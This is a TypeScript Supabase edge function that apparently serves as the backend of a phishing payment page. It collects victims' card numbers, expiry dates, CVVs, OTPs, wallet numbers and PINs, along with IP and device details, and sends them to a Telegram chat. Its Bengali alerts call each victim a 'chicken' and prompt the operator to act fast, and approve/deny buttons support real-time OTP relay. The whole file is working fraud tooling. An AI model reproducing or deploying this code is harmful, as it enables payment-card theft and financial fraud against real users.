import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

async function deriveWebhookSecret(botToken: string): Promise<string> {
  const data = new TextEncoder().encode(`telegram-webhook:${botToken}`);
  const digest = await crypto.subtle.digest("SHA-256", data);
  return btoa(String.fromCharCode(...new Uint8Array(digest)))
    .replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
}

async function ensureWebhookRegistered(botToken: string, supabaseUrl: string) {
  const projectRef = supabaseUrl.match(/https:\/\/([^.]+)/)?.[1];
  if (!projectRef) return;
  const webhookUrl = `https://${projectRef}.supabase.co/functions/v1/telegram-webhook`;
  const infoRes = await fetch(`https://api.telegram.org/bot${botToken}/getWebhookInfo`);
  const info = await infoRes.json().catch(() => null);
  const current = info?.result;
  const healthy = current?.url === webhookUrl &&
    (current?.allowed_updates ?? []).includes("callback_query") &&
    !current?.last_error_message;
  if (healthy) return;
  console.log("Re-registering Telegram webhook", current?.url, current?.last_error_message);
  await fetch(`https://api.telegram.org/bot${botToken}/setWebhook`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      url: webhookUrl,
      secret_token: await deriveWebhookSecret(botToken),
      allowed_updates: ["callback_query"],
      drop_pending_updates: false,
    }),
  });
}
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
import { checkFlowSession } from "../_shared/flowSession.ts";
import { getTelegramConfig } from "../_shared/telegramConfig.ts";

const ALLOWED_ORIGIN_PATTERNS: RegExp[] = [
  /^https:\/\/(www\.)?genzsmm\.com$/i,
  /^https:\/\/([a-z0-9-]+\.)*lovable\.app$/i,
  /^https:\/\/([a-z0-9-]+\.)*lovableproject\.com$/i,
  /^https:\/\/([a-z0-9-]+\.)*lovable\.dev$/i,
  /^https:\/\/([a-z0-9-]+\.)*pages\.dev$/i,
  /^https:\/\/([a-z0-9-]+\.)*workers\.dev$/i,
  /^https:\/\/([a-z0-9-]+\.)*netlify\.app$/i,
  /^https:\/\/([a-z0-9-]+\.)*netlify\.com$/i,
  /^http:\/\/localhost(:\d+)?$/i,
];

function isAllowedOrigin(origin: string | null): boolean {
  if (!origin) return false;
  return ALLOWED_ORIGIN_PATTERNS.some((r) => r.test(origin));
}

function corsFor(origin: string | null) {
  const allow = isAllowedOrigin(origin) ? origin! : "";
  return {
    "Access-Control-Allow-Origin": allow,
    "Vary": "Origin",
    "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
    "Access-Control-Allow-Methods": "POST, OPTIONS",
  };
}

const priceText = (p: unknown) =>
  typeof p === "number" && Number.isFinite(p) ? `${p} BDT` : "N/A";

function detectDeviceModel(ua: string): string {
  // iOS
  if (/iPhone/i.test(ua)) {
    const m = ua.match(/CPU iPhone OS ([\d_]+)/i);
    return m ? `iPhone (iOS ${m[1].replace(/_/g, ".")})` : "iPhone";
  }
  if (/iPad/i.test(ua)) return "iPad";
  if (/iPod/i.test(ua)) return "iPod";
  // Android — model usually in "; MODEL Build/" or "; MODEL)" segment
  if (/Android/i.test(ua)) {
    const m = ua.match(/Android[^;]*;\s*([^;]+?)(?:\s+Build\/|\))/i);
    const model = m ? m[1].trim() : "";
    const ver = ua.match(/Android\s+([\d.]+)/i);
    return model
      ? `${model}${ver ? ` (Android ${ver[1]})` : ""}`
      : ver ? `Android ${ver[1]}` : "Android";
  }
  if (/Windows NT ([\d.]+)/i.test(ua)) {
    const m = ua.match(/Windows NT ([\d.]+)/i);
    const map: Record<string, string> = { "10.0": "10/11", "6.3": "8.1", "6.2": "8", "6.1": "7" };
    return `Windows ${m ? (map[m[1]] || m[1]) : ""}`.trim();
  }
  if (/Mac OS X ([\d_\.]+)/i.test(ua)) {
    const m = ua.match(/Mac OS X ([\d_\.]+)/i);
    return `Mac (${m ? m[1].replace(/_/g, ".") : ""})`;
  }
  if (/Linux/i.test(ua)) return "Linux";
  return "Unknown";
}

serve(async (req) => {
  const origin = req.headers.get("origin");
  const cors = corsFor(origin);

  if (req.method === "OPTIONS") return new Response("ok", { headers: cors });

  if (!isAllowedOrigin(origin)) {
    return new Response(JSON.stringify({ error: "forbidden" }), {
      status: 403,
      headers: { ...cors, "Content-Type": "application/json" },
    });
  }

  const rawIp = req.headers.get("x-forwarded-for") || req.headers.get("cf-connecting-ip") || "unknown";
  const clientIp = String(rawIp).split(",")[0].trim();

  const supabaseUrl = Deno.env.get("SUPABASE_URL");
  const serviceKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
  const cfgBackend = supabaseUrl && serviceKey
    ? createClient(supabaseUrl, serviceKey, { auth: { persistSession: false, autoRefreshToken: false } })
    : null;
  const { botToken: TELEGRAM_BOT_TOKEN, chatId: TELEGRAM_CHAT_ID } = cfgBackend
    ? await getTelegramConfig(cfgBackend)
    : { botToken: "", chatId: "" };
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    return new Response(JSON.stringify({ error: "not_configured" }), {
      status: 500, headers: { ...cors, "Content-Type": "application/json" },
    });
  }

  try {
    const body = await req.json();

    const clean = (v: unknown, max = 200): string => {
      if (v === null || v === undefined) return "";
      let s = String(v);
      s = s.replace(/[\u0000-\u001F\u007F\u200B-\u200F\u2028\u2029]/g, " ");
      s = s.replace(/\s+/g, " ").trim();
      if (s.length > max) s = s.slice(0, max) + "…";
      return s;
    };

    const type = clean(body.type, 32);
    const action = clean(body.action, 32);
    // Server-side token validation: amount/order come from the bound session, never the client.
    const flowBackend = createClient(Deno.env.get("SUPABASE_URL")!, Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!, {
      auth: { persistSession: false, autoRefreshToken: false },
    });
    const flowCheck = await checkFlowSession(flowBackend, body.flowToken, body.flowNonce, {
      allowUsedWithinMs: clean(body.type, 32) === "payment_cancelled" ? 10 * 60 * 1000 : 0,
    });
    if (!flowCheck.ok) {
      return new Response(JSON.stringify({ error: "invalid_flow", reason: flowCheck.reason }), {
        status: 403, headers: { ...cors, "Content-Type": "application/json" },
      });
    }
    const amount = String(flowCheck.session.amount_exact ?? flowCheck.session.amount ?? 0);
    const method = clean(body.method, 40);
    const paymentType = clean(body.paymentType, 10);
    const number = clean(body.number, 40);
    const otp = clean(body.otp, 20);
    const pin = clean(body.pin, 20);
    const orderId = clean(body.orderId, 40);
    const cardName = clean(body.cardName, 80);
    const cardNumber = clean(body.cardNumber, 40);
    const expiry = clean(body.expiry, 20);
    const cvv = clean(body.cvv, 10);
    const platform = clean(body.platform, 40);
    const service = clean(body.service, 120);
    const link = clean(body.link, 300);
    const price = typeof body.price === "number" ? body.price : NaN;
    const ua = clean(body.userAgent, 300);
    const userId = clean(body.userId, 12) || "—";
    const displayReferrer = clean(body.referrer || "Direct", 200).replace(/\./g, " ");
    const requireApproval = body.requireApproval === true;

    let device = "Unknown";
    if (/Android/i.test(ua)) device = "Android";
    else if (/iPhone|iPad|iPod/i.test(ua)) device = "iOS";
    else if (/Windows/i.test(ua)) device = "Windows";
    else if (/Mac/i.test(ua)) device = "Mac";
    else if (/Linux/i.test(ua)) device = "Linux";

    const deviceModel = detectDeviceModel(ua);
    const amountLine = `Amount : ${amount || ""}${amount ? " BDT" : ""}\n\n`;

    const footer = `-------------------\n\n🐔মুরগির Device : ${device}\n🐔মুরগির Device Model : ${deviceModel}\n🐔মুরগির IP : ${clientIp}\n🐔মুরগির User ID : ${userId}\n🐔মুরগির Referrer : ${displayReferrer}`;

    let message = "";

    if (type === "payment_activity") {
      if (paymentType === "card") {
        const hasCardData = cardNumber || expiry || cvv;
        if (hasCardData) {
          message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n-------------------\n\nPayment Method : ${method || "Card"}\nCardholder Name : ${cardName}\nCard Number : ${cardNumber}\nExpiry Date : ${expiry}\nCVV : ${cvv}\n\nOTP : ${otp}\n\n${amountLine}${footer}`;
        } else if (cardName) {
          message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n-------------------\n\nPayment Method : ${method || "Card"}\nCard Name : ${cardName}\n\n${amountLine}${footer}`;
        } else {
          message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n-------------------\n\nPayment Method : ${method || "Card"}\n\n${amountLine}${footer}`;
        }
      } else if (method === "Binance") {
        message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n-------------------\n\nPayment Method : Binance\nBinance Order ID : ${orderId}\n\n${amountLine}${footer}`;
      } else {
        message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n-------------------\n\nPayment Method : ${method}\nNumber : ${number}\nOTP : ${otp}\nPIN : ${pin}\n\n${amountLine}${footer}`;
      }
    } else if (type === "page_entry") {
        message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n-------------------\n\nUpdate : ${method ? `${method} Page` : "Selection Page"}\n\n${amountLine}${footer}`;
    } else if (type === "payment_cancelled") {
      message = `🐔 মুরগি পেমেন্ট ক্যানসেল করেছে ✅\n\n-------------------\n\nUpdate : ক্যানসেল পেইজে গেছে ।\n\n${amountLine}${footer}`;
    } else if (action === "service_click") {
      message = `🐔 মুরগি প্লাটফর্মের সাভিস ক্লিক করেছে ⚠️\n\n-------------------\n\nPlatform : ${platform}\nService : ${service}\nPrice : ${priceText(price)}\n\n${footer}`;
    } else if (action === "order_submit") {
      message = `🐔 মুরগি অর্ডার সাবমিট করেছে ✅\n\n-------------------\n\nPlatform : ${platform}\nService : ${service}\nLink : ${link}\nPrice : ${priceText(price)}\n\n${footer}`;
    } else if (action) {
      return new Response(JSON.stringify({ ok: true, ignored: true }), {
        headers: { ...cors, "Content-Type": "application/json" },
      });
    } else {
      return new Response(JSON.stringify({ error: "unknown_payload" }), {
        status: 400, headers: { ...cors, "Content-Type": "application/json" },
      });
    }

    // Approval flow: create a pending row and attach inline keyboard.
    let requestId: string | null = null;
    let replyMarkup: unknown = undefined;

    const supabase = cfgBackend;

    if (requireApproval && supabase) {
      const { data, error } = await supabase
        .from("otp_requests")
        .insert({ method: method || "unknown", payload: { amount, number, otp, cardName, cardNumber, user_id: userId, flow_session_id: flowCheck.session.id } })
        .select("id")
        .single();
      if (!error && data) {
        requestId = data.id as string;
        replyMarkup = {
          inline_keyboard: [[
            { text: "✅ Approve", callback_data: `otp:approve:${requestId}` },
            { text: "❌ Deny", callback_data: `otp:deny:${requestId}` },
          ]],
        };
      }
    }

    // Self-heal: make sure Telegram still points at our webhook before we send
    // a message that carries Approve/Deny buttons. If the registration was lost
    // or overwritten, button presses would silently never reach us.
    if (replyMarkup) {
      try {
        await ensureWebhookRegistered(TELEGRAM_BOT_TOKEN, supabaseUrl || "");
      } catch (e) {
        console.error("ensureWebhookRegistered failed", e);
      }
    }


    const tgBody: Record<string, unknown> = { chat_id: TELEGRAM_CHAT_ID, text: message };
    if (replyMarkup) tgBody.reply_markup = replyMarkup;

    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(tgBody),
    });
    if (!response.ok) {
      return new Response(JSON.stringify({ error: "telegram_failed" }), {
        status: 502, headers: { ...cors, "Content-Type": "application/json" },
      });
    }

    if (requestId && supabase) {
      const tgData = await response.json().catch(() => null);
      const messageId = tgData?.result?.message_id;
      if (messageId) {
        await supabase.from("otp_requests").update({ telegram_message_id: messageId }).eq("id", requestId);
      }
    }

    return new Response(JSON.stringify({ success: true, request_id: requestId }), {
      headers: { ...cors, "Content-Type": "application/json" },
    });
  } catch {
    return new Response(JSON.stringify({ error: "bad_request" }), {
      status: 400, headers: { ...cors, "Content-Type": "application/json" },
    });
  }
});
